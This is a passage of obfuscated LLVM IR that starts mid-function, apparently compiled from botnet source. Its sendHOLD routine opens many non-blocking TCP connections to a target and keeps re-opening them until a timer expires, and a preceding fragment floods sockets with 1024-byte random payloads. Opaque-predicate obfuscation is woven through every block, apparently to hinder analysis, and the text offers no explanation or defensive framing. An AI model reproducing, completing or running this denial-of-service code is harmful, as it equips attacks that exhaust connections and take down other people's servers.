  %398 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %399 = load i32, i32* %16, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %400
  %402 = getelementptr inbounds %struct.state_t, %struct.state_t* %401, i32 0, i32 0
  store i32 %398, i32* %402, align 8
  %403 = load i32, i32* %16, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %404
  %406 = getelementptr inbounds %struct.state_t, %struct.state_t* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 8
  %408 = load i32, i32* %16, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %409
  %411 = getelementptr inbounds %struct.state_t, %struct.state_t* %410, i32 0, i32 0
  %412 = load i32, i32* %411, align 8
  %413 = call i32 (i32, i32, ...) @fcntl(i32 %412, i32 3, i8* null)
  %_9 = sub i32 %413, 2048
  %gen10 = mul i32 %_9, 2048
  %414 = or i32 %413, 2048
  %415 = call i32 (i32, i32, ...) @fcntl(i32 %407, i32 4, i32 %414)
  %416 = load i32, i32* %16, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %417
  %419 = getelementptr inbounds %struct.state_t, %struct.state_t* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 8
  %421 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %422 = call i32 @connect(i32 %420, %struct.sockaddr* %421, i32 16)
  %423 = icmp ne i32 %422, -1
  br label %originalBB8

originalBB14alteredBB:                            ; preds = %originalBB14, %134
  %424 = load i32, i32* %16, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %425
  %427 = getelementptr inbounds %struct.state_t, %struct.state_t* %426, i32 0, i32 1
  store i8 1, i8* %427, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %157
  %428 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %429 = getelementptr inbounds [16 x i64], [16 x i64]* %428, i64 0, i64 0
  %430 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %429) #2, !srcloc !6
  %431 = extractvalue { i64, i64* } %430, 0
  %432 = extractvalue { i64, i64* } %430, 1
  %433 = trunc i64 %431 to i32
  store i32 %433, i32* %26, align 4
  %434 = ptrtoint i64* %432 to i64
  %435 = trunc i64 %434 to i32
  store i32 %435, i32* %27, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %240
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %273
  %436 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %436, i32 1024)
  %437 = load i32, i32* %16, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %438
  %440 = getelementptr inbounds %struct.state_t, %struct.state_t* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 8
  %442 = load i8*, i8** %24, align 8
  %443 = call i64 @send(i32 %441, i8* %442, i64 1024, i32 16384)
  %444 = icmp eq i64 %443, -1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %299
  %445 = call i32* @__errno_location() #13
  %446 = load i32, i32* %445, align 4
  %447 = icmp ne i32 %446, 11
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %330
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %347
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %480

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %47, %48
  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %461, %34
  %51 = load i32, i32* @x.77
  %52 = load i32, i32* @y.78
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* %17, align 4
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = icmp sgt i32 %59, %60
  %62 = load i32, i32* @x.77
  %63 = load i32, i32* @y.78
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %70, label %462

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.77
  %72 = load i32, i32* @y.78
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  store i32 0, i32* %8, align 4
  %79 = load i32, i32* @x.77
  %80 = load i32, i32* @y.78
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %87

; <label>:87:                                     ; preds = %458, %originalBBpart24
  %88 = load i32, i32* @x.77
  %89 = load i32, i32* @y.78
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %87
  %96 = load i32, i32* %8, align 4
  %97 = load i32, i32* %7, align 4
  %98 = icmp slt i32 %96, %97
  %99 = load i32, i32* @x.77
  %100 = load i32, i32* @y.78
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %98, label %107, label %461

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* %8, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %109
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %110, i32 0, i32 1
  %112 = load i8, i8* %111, align 4
  %113 = zext i8 %112 to i32
  switch i32 %113, label %441 [
    i32 0, label %114
    i32 1, label %190
    i32 2, label %355
  ]

; <label>:114:                                    ; preds = %107
  %115 = load i32, i32* @x.77
  %116 = load i32, i32* @y.78
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %114
  %123 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %124 = load i32, i32* %8, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %125
  %127 = getelementptr inbounds %struct.state_t, %struct.state_t* %126, i32 0, i32 0
  store i32 %123, i32* %127, align 8
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %8, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %134
  %136 = getelementptr inbounds %struct.state_t, %struct.state_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 3, i8* null)
  %139 = or i32 %138, 2048
  %140 = call i32 (i32, i32, ...) @fcntl(i32 %132, i32 4, i32 %139)
  %141 = load i32, i32* %8, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %142
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %147 = call i32 @connect(i32 %145, %struct.sockaddr* %146, i32 16)
  %148 = icmp ne i32 %147, -1
  %149 = load i32, i32* @x.77
  %150 = load i32, i32* @y.78
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart215, label %originalBB10alteredBB

originalBBpart215:                                ; preds = %originalBB10
  br i1 %148, label %161, label %157

; <label>:157:                                    ; preds = %originalBBpart215
  %158 = call i32* @__errno_location() #13
  %159 = load i32, i32* %158, align 4
  %160 = icmp ne i32 %159, 115
  br i1 %160, label %161, label %184

; <label>:161:                                    ; preds = %157, %originalBBpart215
  %162 = load i32, i32* @x.77
  %163 = load i32, i32* @y.78
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %161
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %171
  %173 = getelementptr inbounds %struct.state_t, %struct.state_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 %174)
  %176 = load i32, i32* @x.77
  %177 = load i32, i32* @y.78
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %189

; <label>:184:                                    ; preds = %157
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 1, i8* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %184, %originalBBpart219
  br label %441

; <label>:190:                                    ; preds = %107
  br label %191

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %193 = getelementptr inbounds [16 x i64], [16 x i64]* %192, i64 0, i64 0
  %194 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %193) #2, !srcloc !7
  %195 = extractvalue { i64, i64* } %194, 0
  %196 = extractvalue { i64, i64* } %194, 1
  %197 = trunc i64 %195 to i32
  store i32 %197, i32* %18, align 4
  %198 = ptrtoint i64* %196 to i64
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %19, align 4
  br label %200

; <label>:200:                                    ; preds = %191
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* @x.77
  %203 = load i32, i32* @y.78
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %201
  %210 = load i32, i32* %8, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %211
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 8
  %215 = srem i32 %214, 64
  %216 = zext i32 %215 to i64
  %217 = shl i64 1, %216
  %218 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = sdiv i32 %223, 64
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [16 x i64], [16 x i64]* %218, i64 0, i64 %225
  %227 = load i64, i64* %226, align 8
  %228 = or i64 %227, %217
  store i64 %228, i64* %226, align 8
  %229 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %229, align 8
  %230 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %230, align 8
  %231 = load i32, i32* %8, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 8
  %236 = add nsw i32 %235, 1
  %237 = call i32 @select(i32 %236, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %237, i32* %15, align 4
  %238 = load i32, i32* %15, align 4
  %239 = icmp eq i32 %238, 1
  %240 = load i32, i32* @x.77
  %241 = load i32, i32* @y.78
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart258, label %originalBB21alteredBB

originalBBpart258:                                ; preds = %originalBB21
  br i1 %239, label %248, label %339

; <label>:248:                                    ; preds = %originalBBpart258
  %249 = load i32, i32* @x.77
  %250 = load i32, i32* @y.78
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %248
  store i32 4, i32* %13, align 4
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 8
  %262 = bitcast i32* %14 to i8*
  %263 = call i32 @getsockopt(i32 %261, i32 1, i32 4, i8* %262, i32* %13) #2
  %264 = load i32, i32* %14, align 4
  %265 = icmp ne i32 %264, 0
  %266 = load i32, i32* @x.77
  %267 = load i32, i32* @y.78
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %265, label %274, label %301

; <label>:274:                                    ; preds = %originalBBpart262
  %275 = load i32, i32* @x.77
  %276 = load i32, i32* @y.78
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %274
  %283 = load i32, i32* %8, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %284
  %286 = getelementptr inbounds %struct.state_t, %struct.state_t* %285, i32 0, i32 0
  %287 = load i32, i32* %286, align 8
  %288 = call i32 @close(i32 %287)
  %289 = load i32, i32* %8, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %290
  %292 = getelementptr inbounds %struct.state_t, %struct.state_t* %291, i32 0, i32 1
  store i8 0, i8* %292, align 4
  %293 = load i32, i32* @x.77
  %294 = load i32, i32* @y.78
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %322

; <label>:301:                                    ; preds = %originalBBpart262
  %302 = load i32, i32* @x.77
  %303 = load i32, i32* @y.78
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %301
  %310 = load i32, i32* %8, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %311
  %313 = getelementptr inbounds %struct.state_t, %struct.state_t* %312, i32 0, i32 1
  store i8 2, i8* %313, align 4
  %314 = load i32, i32* @x.77
  %315 = load i32, i32* @y.78
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %322

; <label>:322:                                    ; preds = %originalBBpart270, %originalBBpart266
  %323 = load i32, i32* @x.77
  %324 = load i32, i32* @y.78
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %322
  %331 = load i32, i32* @x.77
  %332 = load i32, i32* @y.78
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %354

; <label>:339:                                    ; preds = %originalBBpart258
  %340 = load i32, i32* %15, align 4
  %341 = icmp eq i32 %340, -1
  br i1 %341, label %342, label %353

; <label>:342:                                    ; preds = %339
  %343 = load i32, i32* %8, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %344
  %346 = getelementptr inbounds %struct.state_t, %struct.state_t* %345, i32 0, i32 0
  %347 = load i32, i32* %346, align 8
  %348 = call i32 @close(i32 %347)
  %349 = load i32, i32* %8, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %350
  %352 = getelementptr inbounds %struct.state_t, %struct.state_t* %351, i32 0, i32 1
  store i8 0, i8* %352, align 4
  br label %353

; <label>:353:                                    ; preds = %342, %339
  br label %354

; <label>:354:                                    ; preds = %353, %originalBBpart274
  br label %441

; <label>:355:                                    ; preds = %107
  br label %356

; <label>:356:                                    ; preds = %355
  %357 = load i32, i32* @x.77
  %358 = load i32, i32* @y.78
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %356
  %365 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %366 = getelementptr inbounds [16 x i64], [16 x i64]* %365, i64 0, i64 0
  %367 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %366) #2, !srcloc !8
  %368 = extractvalue { i64, i64* } %367, 0
  %369 = extractvalue { i64, i64* } %367, 1
  %370 = trunc i64 %368 to i32
  store i32 %370, i32* %20, align 4
  %371 = ptrtoint i64* %369 to i64
  %372 = trunc i64 %371 to i32
  store i32 %372, i32* %21, align 4
  %373 = load i32, i32* @x.77
  %374 = load i32, i32* @y.78
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %381

; <label>:381:                                    ; preds = %originalBBpart278
  br label %382

; <label>:382:                                    ; preds = %381
  %383 = load i32, i32* %8, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %384
  %386 = getelementptr inbounds %struct.state_t, %struct.state_t* %385, i32 0, i32 0
  %387 = load i32, i32* %386, align 8
  %388 = srem i32 %387, 64
  %389 = zext i32 %388 to i64
  %390 = shl i64 1, %389
  %391 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %392 = load i32, i32* %8, align 4
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %393
  %395 = getelementptr inbounds %struct.state_t, %struct.state_t* %394, i32 0, i32 0
  %396 = load i32, i32* %395, align 8
  %397 = sdiv i32 %396, 64
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds [16 x i64], [16 x i64]* %391, i64 0, i64 %398
  %400 = load i64, i64* %399, align 8
  %401 = or i64 %400, %390
  store i64 %401, i64* %399, align 8
  %402 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %402, align 8
  %403 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %403, align 8
  %404 = load i32, i32* %8, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %405
  %407 = getelementptr inbounds %struct.state_t, %struct.state_t* %406, i32 0, i32 0
  %408 = load i32, i32* %407, align 8
  %409 = add nsw i32 %408, 1
  %410 = call i32 @select(i32 %409, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %410, i32* %15, align 4
  %411 = load i32, i32* %15, align 4
  %412 = icmp ne i32 %411, 0
  br i1 %412, label %413, label %440

; <label>:413:                                    ; preds = %382
  %414 = load i32, i32* @x.77
  %415 = load i32, i32* @y.78
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %413
  %422 = load i32, i32* %8, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %423
  %425 = getelementptr inbounds %struct.state_t, %struct.state_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 8
  %427 = call i32 @close(i32 %426)
  %428 = load i32, i32* %8, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %429
  %431 = getelementptr inbounds %struct.state_t, %struct.state_t* %430, i32 0, i32 1
  store i8 0, i8* %431, align 4
  %432 = load i32, i32* @x.77
  %433 = load i32, i32* @y.78
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %440

; <label>:440:                                    ; preds = %originalBBpart282, %382
  br label %441

; <label>:441:                                    ; preds = %440, %354, %189, %107
  %442 = load i32, i32* @x.77
  %443 = load i32, i32* @y.78
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %441
  %450 = load i32, i32* @x.77
  %451 = load i32, i32* @y.78
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %458

; <label>:458:                                    ; preds = %originalBBpart286
  %459 = load i32, i32* %8, align 4
  %460 = add nsw i32 %459, 1
  store i32 %460, i32* %8, align 4
  br label %87

; <label>:461:                                    ; preds = %originalBBpart28
  br label %50

; <label>:462:                                    ; preds = %originalBBpart2
  %463 = load i32, i32* @x.77
  %464 = load i32, i32* @y.78
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %462
  %471 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %471)
  %472 = load i32, i32* @x.77
  %473 = load i32, i32* @y.78
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %480

; <label>:480:                                    ; preds = %originalBBpart290, %33
  ret void

